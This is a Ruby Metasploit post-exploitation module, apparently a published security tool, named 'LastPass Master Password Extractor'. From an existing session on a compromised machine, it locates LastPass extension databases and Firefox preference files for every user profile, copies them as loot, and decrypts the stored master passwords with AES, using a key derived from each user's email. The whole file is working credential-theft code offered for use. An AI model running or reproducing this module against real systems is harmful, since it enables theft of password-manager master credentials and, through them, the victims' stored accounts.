require 'msf/core'
require 'base64'
require 'sqlite3'
require 'uri'

class Metasploit3 < Msf::Post
  include Msf::Post::File
  include Msf::Post::Windows::UserProfiles
  include Msf::Post::OSX::System
  include Msf::Post::Unix

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'LastPass Master Password Extractor',
      'Description' => %q{
        This module extracts and decrypts LastPass master login accounts and passwords.
      },
      'License' => MSF_LICENSE,
      'Author' => ['Alberto Garcia Illera <agarciaillera[at]gmail.com>', 'Martin Vigo <martinvigo[at]gmail.com>'],
      'Platform' => %w(linux osx unix win),
      'SessionTypes' => %w(meterpreter shell)
    ))
  end

  def run
    if session.platform =~ /win/ && session.type == "shell" # No Windows shell support
      print_error "Shell sessions on Windows are not supported"
      return
    end

    print_status "Searching for LastPass databases..."

    db_map = get_database_paths # Find databases and get the remote paths
    if db_map.empty?
      print_status "No databases found"
      return
    end

    print_status "Looking for credentials in all databases found..."

    # an array of [user, encrypted password, browser]
    credentials = [] # All credentials to be decrypted
    db_map.each_pair do |browser, paths|
      if browser == 'Firefox'
        paths.each do |path|
          data = read_file(path)
          loot_path = store_loot('firefox.preferences', 'text/javascript', session, data, nil, "Firefox preferences file #{path}")

          # Extract usernames and passwords from preference file
          firefox_encoded_creds = firefox_credentials(loot_path)
          next unless firefox_encoded_creds
          firefox_encoded_creds.each do |creds|
            credentials << [URI.unescape(creds[0]), URI.unescape(creds[1]), browser] unless creds[0].nil? || creds[1].nil?
          end
        end
      else # Chrome, Safari and Opera
        paths.each do |path|
          data = read_file(path)
          loot_path = store_loot("#{browser.downcase}.lastpass.database", 'application/x-sqlite3', session, data, nil, "#{browser} LastPass database #{path}")

          # Parsing/Querying the DB
          db = SQLite3::Database.new(loot_path)
          user, pass = db.execute("SELECT username, password FROM LastPassSavedLogins2 WHERE username IS NOT NULL AND username != '' AND password IS NOT NULL AND password != '';").flatten
          credentials << [user, pass, browser] if user && pass
        end
      end
    end

    credentials_table = Rex::Ui::Text::Table.new('Header' => "LastPass credentials", 'Indent' => 1, 'Columns' => %w(Username Password Browser))
    # Parse and decrypt credentials
    credentials.each do |row| # Decrypt passwords
      user, enc_pass, browser = row
      print_status "Decrypting password for user #{user} from #{browser}..."
      password = clear_text_password(user, enc_pass)
      credentials_table << [user, password, browser]
    end
    print_good credentials_table.to_s
  end

  # Finds the databases in the victim's machine
  def get_database_paths
    platform = session.platform
    existing_profiles = get_user_profiles
    found_dbs_map = {
      'Chrome' => [],
      'Firefox' => [],
      'Opera' => [],
      'Safari' => []
    }

    browser_path_map = {}

    case platform
    when /win/
      existing_profiles.each do |user_profile|
        print_status "Found user: #{user_profile['UserName']}"
        browser_path_map = {
          'Chrome' => "#{user_profile['LocalAppData']}\\Google\\Chrome\\User Data\\Default\\databases\\chrome-extension_hdokiejnpimakedhajhdlcegeplioahd_0",
          'Firefox' => "#{user_profile['AppData']}\\Mozilla\\Firefox\\Profiles",
          'Opera' => "#{user_profile['AppData']}\\Opera Software\\Opera Stable\\databases\\chrome-extension_hnjalnkldgigidggphhmacmimbdlafdo_0",
          'Safari' => "#{user_profile['LocalAppData']}\\Apple Computer\\Safari\\Databases\\safari-extension_com.lastpass.lpsafariextension-n24rep3bmn_0"
        }
      end
    when /unix|linux/
      existing_profiles.each do |user_profile|
        print_status "Found user: #{user_profile['UserName']}"
        browser_path_map = {
          'Chrome' => "#{user_profile['LocalAppData']}/.config/google-chrome/Default/databases/chrome-extension_hdokiejnpimakedhajhdlcegeplioahd_0",
          'Firefox' => "#{user_profile['LocalAppData']}/.mozilla/firefox",
        }
      end
    when /osx/
      existing_profiles.each do |user_profile|
        print_status "Found user: #{user_profile['UserName']}"
        browser_path_map = {
          'Chrome' => "#{user_profile['LocalAppData']}/Google/Chrome/Default/databases/chrome-extension_hdokiejnpimakedhajhdlcegeplioahd_0",
          'Firefox' => "#{user_profile['LocalAppData']}\\Firefox\\Profiles",
          'Opera' => "#{user_profile['LocalAppData']}/com.operasoftware.Opera/databases/chrome-extension_hnjalnkldgigidggphhmacmimbdlafdo_0",
          'Safari' => "#{user_profile['AppData']}/Safari/Databases/safari-extension_com.lastpass.lpsafariextension-n24rep3bmn_0"
        }
      end
    else
      print_error "platform not recognized: #{platform}"
    end

    browser_path_map.each_pair do |browser, path|
      found_dbs_map[browser] |= find_db_paths(path, browser)
    end

    found_dbs_map
  end

  # Returns a list of DB paths found in the victims' machine
  def find_db_paths(path, browser)
    found_dbs_paths = []

    print_status "Checking in #{browser}..."
    if browser == "Firefox" # Special case for Firefox
      profiles = get_firefox_profile_files(path, browser)
      unless profiles.empty?
        print_good "Found #{profiles.size} profile files in Firefox"
        found_dbs_paths |= profiles
      end
    else
      found_dbs_paths |= file_paths(path, browser)
    end

    found_dbs_paths
  end

  # Returns the relevant information from user profiles
  def get_user_profiles
    user_profiles = []
    case session.platform
    when /unix|linux/
      if session.type == "meterpreter"
        user_names = client.fs.dir.entries("/home")
      else
        user_names = session.shell_command("ls /home").split
      end
      user_names.reject! { |u| %w(. ..).include?(u) }
      user_names.each do |user_name|
        user_profiles.push('UserName' => user_name, "LocalAppData" => "/home/#{user_name}")
      end
    when /osx/
      user_names = session.shell_command("ls /Users").split
      user_names.reject! { |u| u == 'Shared' }
      user_names.each do |user_name|
        user_profiles.push(
          'UserName' => user_name,
          "AppData" => "/Users/#{user_name}/Library",
          "LocalAppData" => "/Users/#{user_name}/Library/Application Support"
        )
      end
    when /win/
      user_profiles |= grab_user_profiles
    else
      print_error "OS not recognized: #{os}"
    end
    user_profiles
  end

  # Extracts the databases paths from the given folder ignoring . and ..
  def file_paths(path, browser)
    found_dbs_paths = []

    if directory?(path)
      if session.type == "meterpreter"
        files = client.fs.dir.entries(path)
        files.each do |file_path|
          found_dbs_paths.push(File.join(path, file_path)) if file_path != '.' &&  file_path != '..'
        end

      elsif session.type == "shell"
        files = session.shell_command("ls \"#{path}\"").split
        files.each do |file_path|
          found_dbs_paths.push(File.join(path, file_path)) if file_path != 'Shared'
        end

      else
        print_error "Session type not recognized: #{session.type}"
        return found_dbs_paths
      end
    end

    if found_dbs_paths.empty?
      print_status "No databases found for #{browser}"
    else
      print_good "Found #{found_dbs_paths.size} database/s in #{browser}"
    end
    found_dbs_paths
  end

  # Returns the profile files for Firefox
  def get_firefox_profile_files(path, browser)
    found_dbs_paths = []

    if directory?(path)
      if session.type == "meterpreter"
        files = client.fs.dir.entries(path)
      elsif session.type == "shell"
        files = session.shell_command("ls \"#{path}\"").split
      else
        print_error "Session type not recognized: #{session.type}"
        return found_dbs_paths
      end
    end

    files.reject! { |file| %w(. ..).include?(file) }
    files.each do |file_path|
      found_dbs_paths.push(File.join(path, file_path, 'prefs.js')) if file_path.match(/.*\.default/)
    end

    if found_dbs_paths.empty?
      print_status "No profile paths found for #{browser}"
    end
    found_dbs_paths
  end

  # Parses the Firefox preferences file and returns encoded credentials
  def firefox_credentials(loot_path)
    credentials = []
    password_line = nil
    File.readlines(loot_path).each do |line|
      password_line = line if line['extensions.lastpass.loginpws']
    end

    return nil unless password_line

    if password_line.match(/user_pref\("extensions.lastpass.loginpws", "(.*)"\);/)
      encoded_credentials = password_line.match(/user_pref\("extensions.lastpass.loginpws", "(.*)"\);/)[1]
    else
      return nil
    end

    creds_per_user = encoded_credentials.split("|")
    creds_per_user.each do |user_creds|
      credentials.push(user_creds.split("=")) if user_creds.split("=").size > 1 # Any valid credentials present?
    end

    credentials
  end

  # Decrypts the password
  def clear_text_password(email, encrypted_data)
    return if encrypted_data.blank?

    sha256_hex_email = OpenSSL::Digest::SHA256.hexdigest(email)
    sha256_binary_email = [sha256_hex_email].pack "H*" # Do hex2bin

    if encrypted_data.include?("|") # Apply CBC
      decipher = OpenSSL::Cipher.new("AES-256-CBC")
      decipher.decrypt
      decipher.key = sha256_binary_email # The key is the emails hashed to SHA256 and converted to binary
      decipher.iv = Base64.decode64(encrypted_data[1, 24]) # Discard ! and |
      encrypted_password = encrypted_data[26..-1]
      begin
        decipher_result = decipher.update(Base64.decode64(encrypted_password)) + decipher.final
      rescue
        print_error "Password could not be decrypted"
        return nil
      end

    else # Apply ECB
      decipher = OpenSSL::Cipher.new("AES-256-ECB")
      decipher.decrypt
      decipher.key = sha256_binary_email
      begin
        decipher_result = decipher.update(Base64.decode64(encrypted_data)) + decipher.final
      rescue
        print_error "Password could not be decrypted"
        return nil
      end
    end

    decipher_result
  end
end
